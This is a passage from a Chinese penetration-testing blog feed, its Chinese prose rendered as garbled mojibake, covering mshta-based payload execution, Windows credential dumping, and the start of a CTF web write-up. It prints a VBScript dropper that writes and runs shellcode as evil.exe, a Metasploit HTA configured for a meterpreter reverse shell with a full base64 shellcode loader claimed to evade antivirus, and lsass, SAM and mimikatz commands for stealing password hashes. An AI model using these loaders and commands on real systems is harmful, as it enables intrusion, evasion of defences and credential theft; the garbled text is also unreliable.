var_obj.GetTempName()</span><br><span class="line">var_obj.CreateFolder(var_basedir)</span><br><span class="line">var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">    var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">Next</span><br><span class="line">var_stream.Close</span><br><span class="line">Dim var_shell</span><br><span class="line">Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">var_shell.run var_tempexe, 0, true</span><br><span class="line">var_obj.DeleteFile(var_tempexe)</span><br><span class="line">var_obj.DeleteFolder(var_basedir)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">var_func</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>ÂèØ‰ª•ÁúãÂà∞shellcode‰∏∫PEÊ†ºÂºèÔºåÊâßË°åË∞ÉÁî®<strong>Wscript.shell</strong></p><p>ÂêåÊ†∑‰ºöË¢´DefenderÊã¶Êà™</p><h2 id="0x04-MetaSploit-windows-defender-js-hta"><a href="#0x04-MetaSploit-windows-defender-js-hta" class="headerlink" title="0x04 MetaSploit::windows_defender_js_hta"></a>0x04 MetaSploit::windows_defender_js_hta</h2><p>Msf5Êõ¥Êñ∞ÂêéÊñ∞Âä†ÂÖ•‰∫Ü‰∏§‰∏™evasion</p><ul><li>evasion/windows/windows_defender_exe    </li><li>evasion/windows/windows_defender_js_hta</li></ul><p>exeÊä•ÊØíÊúâÁÇπÊÉ®Ê∑°<br><img src="/Command Execute By mshta.resources/B6C6E6B0-3C41-42D7-BF90-D9A56BC9A978.png" alt="3e2ff0218d8efce1f3709b339560c13e"></p><p>‰ΩÜÊòØdefenderÂíåÁÅ´ÁªíËøòÊòØÊ≤°ÂÖ≥Á≥ªÁöÑ<br><img src="/Command Execute By mshta.resources/75AFC5D0-7E89-46F7-86ED-61BAB04C8FB7.png" alt="dc2b1ad02452c9baafe83eae5ee3d588"></p><p>htaÊñá‰ª∂<br><img src="/Command Execute By mshta.resources/4CE33D9E-5EC8-406F-82E9-16346C446AC9.png" alt="d83749536340df88df744509897dc80a"><br>Defender,ÁÅ´ÁªíÔºå360ÈÉΩËÉΩËøá<br><img src="/Command Execute By mshta.resources/EBD86609-7BFE-4000-84DA-F44CE9DEFE45.png" alt="0533eaf110cdcc3a1583fd3e03cb12ed"></p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use evasion/windows/windows_defender_js_hta</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lhost 192.168.1</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.1.105  <span class="built_in">set</span> lhost 192.168.121.1</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lhost 192.168.1.105</span><br><span class="line">lhost =&gt; 192.168.1.105</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; <span class="built_in">set</span> lport 8877</span><br><span class="line">lport =&gt; 8877</span><br><span class="line">msf5 evasion(windows/windows_defender_js_hta) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] QWZwXErrm.hta stored at /Users/patrilic/.msf4/<span class="built_in">local</span>/QWZwXErrm.hta</span><br></pre></td></tr></table></figure><p>Ê†∏ÂøÉ‰ª£Á†Å<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> System;</span><br><span class="line"><span class="keyword">import</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">import</span> System.Reflection;</span><br><span class="line"><span class="keyword">import</span> System.Reflection.Emit;</span><br><span class="line"><span class="keyword">import</span> System.Runtime;</span><br><span class="line"><span class="keyword">import</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InvokeWin32</span>(<span class="params">dllName:String, returnType:Type,</span></span></span><br><span class="line"><span class="function"><span class="params">  methodName:String, parameterTypes:Type[], parameters:Object[]</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// Begin to build the dynamic assembly</span></span><br><span class="line">  <span class="keyword">var</span> domain = AppDomain.CurrentDomain;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="keyword">new</span> System.Reflection.AssemblyName(<span class="string">'PInvokeAssembly'</span>);</span><br><span class="line">  <span class="keyword">var</span> assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);</span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">module</span> = assembly.DefineDynamicModule(<span class="string">'PInvokeModule'</span>);</span><br><span class="line">  <span class="keyword">var</span> type = <span class="built_in">module</span>.DefineType(<span class="string">'PInvokeType'</span>,TypeAttributes.Public + TypeAttributes.BeforeFieldInit);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Define the actual P/Invoke method</span></span><br><span class="line">  <span class="keyword">var</span> method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Apply the P/Invoke constructor</span></span><br><span class="line">  <span class="keyword">var</span> ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType(<span class="string">"System.String"</span>)]);</span><br><span class="line">  <span class="keyword">var</span> attr = <span class="keyword">new</span> System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);</span><br><span class="line">  method.SetCustomAttribute(attr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the temporary type, and invoke the method.</span></span><br><span class="line">  <span class="keyword">var</span> realType = type.CreateType();</span><br><span class="line">  <span class="keyword">return</span> realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, <span class="literal">null</span>, <span class="literal">null</span>, parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">VirtualAlloc</span>(<span class="params"> lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>)];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [lpStartAddr, size, flAllocationType, flProtect];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"VirtualAlloc"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreateThread</span>(<span class="params"> lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.UInt32"</span>),Type.GetType(<span class="string">"System.IntPtr"</span>),Type.GetType(<span class="string">"System.IntPtr"</span>), Type.GetType(<span class="string">"System.UInt32"</span>), Type.GetType(<span class="string">"System.UInt32"</span>) ];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"CreateThread"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WaitForSingleObject</span>(<span class="params"> handle:IntPtr, dwMiliseconds:UInt32</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parameterTypes:Type[] = [Type.GetType(<span class="string">"System.IntPtr"</span>),Type.GetType(<span class="string">"System.UInt32"</span>)];</span><br><span class="line">  <span class="keyword">var</span> parameters:<span class="built_in">Object</span>[] = [handle, dwMiliseconds ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> InvokeWin32(<span class="string">"kernel32.dll"</span>, Type.GetType(<span class="string">"System.IntPtr"</span>), <span class="string">"WaitForSingleObject"</span>, parameterTypes,  parameters );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ShellCodeExec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> MEM_COMMIT:uint = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">var</span> PAGE_EXECUTE_READWRITE:uint = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> shellcodestr:<span class="built_in">String</span> = <span class="string">'/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACKtwKgBaUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c='</span></span><br><span class="line">  <span class="keyword">var</span> shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);</span><br><span class="line">  <span class="keyword">var</span> funcAddr:IntPtr = VirtualAlloc(<span class="number">0</span>, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Marshal.Copy(shellcode, <span class="number">0</span>, funcAddr, shellcode.Length);</span><br><span class="line">  <span class="keyword">var</span> hThread:IntPtr = IntPtr.Zero;</span><br><span class="line">  <span class="keyword">var</span> threadId:UInt32 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// prepare data</span></span><br><span class="line">  <span class="keyword">var</span> pinfo:IntPtr = IntPtr.Zero;</span><br><span class="line">  <span class="comment">// execute native code</span></span><br><span class="line">  hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, threadId);</span><br><span class="line">  WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">ShellCodeExec();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>hta‰ª£Á†ÅÁâáÊÆµ<br><img src="/Command Execute By mshta.resources/A22F7D47-1CAA-4355-AF27-5A63E461D7D4.png" alt="a67569474b21379b1c9d6c0b41a63a4e"></p><p>Wscript.shellÊâßË°å </p><p>ÁîüÊàêJSÊâßË°åShellcode</p><h3 id="0x05-LINKS"><a href="#0x05-LINKS" class="headerlink" title="0x05 LINKS"></a>0x05 LINKS</h3><p><a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta" target="_blank" rel="noopener">CACTUSTORCH.hta</a><br><a href="https://www.cnblogs.com/backlion/p/10491616.html" target="_blank" rel="noopener">‰ΩøÁî®mshta.exeÁªïËøáÂ∫îÁî®Á®ãÂ∫èÁôΩÂêçÂçïÔºàÂ§öÁßçÊñπÊ≥ïÔºâ</a><br><a href="https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3.pdf" target="_blank" rel="noopener">Á¨¨‰∏ÉÂçÅ‰∫îËØæÔºöÂü∫‰∫éÁôΩÂêçÂçïMshta.exeÊâßË°åpayloadÁ¨¨‰∫îÂ≠£</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-mshta&quot;&gt;&lt;a href=&quot;#0x01-mshta&quot; class=&quot;headerlink&quot; title=&quot;0x01 mshta&quot;&gt;&lt;/a&gt;0x01 mshta&lt;/h2&gt;&lt;p&gt;üëâÂÆòÊñπÊñáÊ°£Áõ¥ÈÄöËΩ¶ ‚Äì&amp;gt;&lt;a href=&quot;https://docs.m
      
    
    </summary>
    
    
      <category term="ÂëΩ‰ª§ÊâßË°å" scheme="http://patrilic.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Â∏∏Áî® Windows ÊäìÂèñHash</title>
    <link href="http://patrilic.top/2019/05/05/Windows%20%E6%8A%93%E5%8F%96Hash/"/>
    <id>http://patrilic.top/2019/05/05/Windows ÊäìÂèñHash/</id>
    <published>2019-05-04T16:20:33.000Z</published>
    <updated>2019-07-08T15:43:32.953Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êé®Ëçê‰ΩøÁî® ProcdumpÔºåreg Âíå sharpdump ÂØºÂá∫Êú¨Âú∞ÔºåÂÜçÊÉ≥ÂäûÊ≥ï‰ªéÂÜÖÁΩë‰∏≠ËøêÂá∫Êù•Êú¨Âú∞Á†¥Ëß£</strong></p><p>ÊµãËØïÊú∫Âô®: Windows 10 1809</p><h2 id="0x01-Procdump-Mimikatz"><a href="#0x01-Procdump-Mimikatz" class="headerlink" title="0x01 Procdump + Mimikatz"></a>0x01 Procdump + Mimikatz</h2><p>Procdump<br>(ÁÆ°ÁêÜÂëòÊùÉÈôê‰∏ãËøêË°å)<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 32 <span class="title">bits</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -64 -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 64 <span class="title">bits</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/Windows ÊäìÂèñHash.resources/5FE37FF2-25D9-45B1-851E-874383718EE9.png" alt="ac82bb7eeb7a22a8374cf6d938f39723"></p><p>ÁÑ∂ÂêéÊú¨Âú∞Ëß£Âá∫hashÂç≥ÂèØ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump C:\lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p><p><img src="/Windows ÊäìÂèñHash.resources/BE8A461A-1A00-4764-BB1D-8C96C38779A4.png" alt="8217226578225fab9a1492a3aeca235d"></p><h2 id="0x02-Reg-impacket-Mimikatz-Âº∫Êé®"><a href="#0x02-Reg-impacket-Mimikatz-Âº∫Êé®" class="headerlink" title="0x02 Reg + impacket/Mimikatz (Âº∫Êé®)"></a>0x02 Reg + impacket/Mimikatz (Âº∫Êé®)</h2><p>‰ΩøÁî®<strong>Reg</strong>ÈúÄË¶ÅNT/SYSTEMÊùÉÈôê<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\security security.hiv</span><br></pre></td></tr></table></figure></p><h3 id="Mimikatz-Ë∞ÉÁî®-lsadump"><a href="#Mimikatz-Ë∞ÉÁî®-lsadump" class="headerlink" title="Mimikatz Ë∞ÉÁî® lsadump"></a>Mimikatz Ë∞ÉÁî® lsadump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure><p><img src="/Windows ÊäìÂèñHash.resources/6FE3B05C-F2BD-4C78-B26D-E4BF0476BECE.png" alt="db38857f0f6c6dc2c9f9035664e6993d"></p><h3 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="impacket/secretsdump.py"></a>impacket/secretsdump.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><p><img src="/Windows ÊäìÂèñHash.resources/E7E2A416-FD55-4F50-A437-876466B61879.png" alt="242aff6a39bba29a99ef4947d7a99cc2"></p><h2 id="0x03-Sharpdump-Âº∫Êé®"><a href="#0x03-Sharpdump-Âº∫Êé®" class="headerlink" title="0x03 Sharpdump  (Âº∫Êé®)"></a>0x03 Sharpdump  (Âº∫Êé®)</h2><p>Out-Minidump.ps1 ÁöÑ C#ÁâàÊú¨ ÁºñËØëÁªìÊûú<br>ÈúÄË¶Å.NET 3.5ÁâàÊú¨Ê°ÜÊû∂<br><img src="/Windows ÊäìÂèñHash.resources/0895B794-5AA9-485E-85A2-F8130EAD8EC5.png" alt="45e9926e499fde1ffa70410d600137ee"></p><h2 id="0x04-Wce„ÄÅQuarks-PwDump„ÄÅGetPass‚Ä¶‚Ä¶"><a href="#0x04-Wce„ÄÅQuarks-PwDump„ÄÅGetPass‚Ä¶‚Ä¶" class="headerlink" title="0x04 Wce„ÄÅQuarks PwDump„ÄÅGetPass‚Ä¶‚Ä¶"></a>0x04 Wce„ÄÅQuarks PwDump„ÄÅGetPass‚Ä¶‚Ä¶</h2><p>Ê≤°ÊÄé‰πàÁî®ËøáÔºåÈÉΩÊòØ‰ª•ÂâçÊØîËæÉËÄÅÁöÑÔºåGetpassÊòØMimikatzÁöÑÁºñËØëÁâàÊú¨ÔºåÊ≤°Âï•ÊÑèÊÄù</p><h2 id="0x05-Msf-modules"><a href="#0x05-Msf-modules" class="headerlink" title="0x05 Msf modules"></a>0x05 Msf modules</h2><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>Êù°‰ª∂:</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows ÊäìÂèñHash.resources/2EB1A5C5-7939-4533-B30F-88DDD7CDB06F.png" alt="07030d8ceedbedabf174df555d21d903"></p><p>hashdumpÂè™ËÉΩdumpÊú¨Âú∞Áî®Êà∑</p><h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><p>Êù°‰ª∂</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows ÊäìÂèñHash.resources/8985233C-E94F-49FE-9D8E-C6904AC4DD44.png" alt="ba9d49921ba6634abcc41e4ee0dfc0d1"></p><p>ÂèØ‰ª•dumpÊú¨Âú∞ + ÂüüÁî®Êà∑hash</p><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>Êù°‰ª∂</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows ÊäìÂèñHash.resources/83900C86-A8C7-4190-B99A-AA696699C1B5.png" alt="0bb8fe85b3463c08b98173e8493190df"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êé®Ëçê‰ΩøÁî® ProcdumpÔºåreg Âíå sharpdump ÂØºÂá∫Êú¨Âú∞ÔºåÂÜçÊÉ≥ÂäûÊ≥ï‰ªéÂÜÖÁΩë‰∏≠ËøêÂá∫Êù•Êú¨Âú∞Á†¥Ëß£&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ÊµãËØïÊú∫Âô®: Windows 10 1809&lt;/p&gt;
&lt;h2 id=&quot;0x01-Procdump-Mimikatz&quot;&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="ÂÜÖÁΩëÊ∏óÈÄè" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõÈÉ®ÂàÜWeb Write up</title>
    <link href="http://patrilic.top/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWrite%20up/"/>
    <id>http://patrilic.top/2019/04/23/Á¨¨ÂçÅ‰∫åÂ±äÂÖ®ÂõΩÂ§ßÂ≠¶Áîü‰ø°ÊÅØÂÆâÂÖ®Á´ûËµõÂàùËµõWrite up/</id>
    <published>2019-04-23T03:20:33.000Z</published>
    <updated>2019-07-08T15:44:41.764Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="Web1-JustSoso"><a href="#Web1-JustSoso" class="headerlink" title="Web1 - JustSoso"></a>Web1 - JustSoso</h2><p><strong>Index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($payload)) &#123;</span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span> ($query <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>, $value)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'gg'</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>Hint.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÁªïËøáwakeup</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span 